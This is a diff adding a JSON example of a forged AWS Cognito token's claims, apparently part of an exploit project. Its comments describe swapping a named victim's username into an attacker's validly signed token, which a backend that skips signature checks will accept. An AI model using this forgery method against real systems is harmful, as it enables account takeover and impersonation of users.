@@ -1,0 +1,16 @@
+{
+  "_comment": "Example of the claims section of a FORGED Cognito JWT. All real IDs are placeholders - fill them from your own token before testing.",
+  "_original_victim_user": "reyyynad",
+  "_description": "The forger script (exploit.py) takes the attacker's own valid JWT and swaps username/cognito:username (and optionally sub) with the victim's values while keeping the original signature. The backend decodes-but-does-not-verify, so it accepts the forgery.",
+  "forged_claims_example": {
+    "sub": "<ATTACKER-SUB-OR-VICTIM-SUB>",
+    "cognito:groups": ["users"],
+    "iss": "https://cognito-idp.us-east-1.amazonaws.com/<POOL-ID>",
+    "cognito:username": "reyyynad",
+    "username": "reyyynad",
+    "aud": "<APP-CLIENT-ID>",
+    "token_use": "id",
+    "exp": 1760000000,
+    "iat": 1759996400
+  }
+}
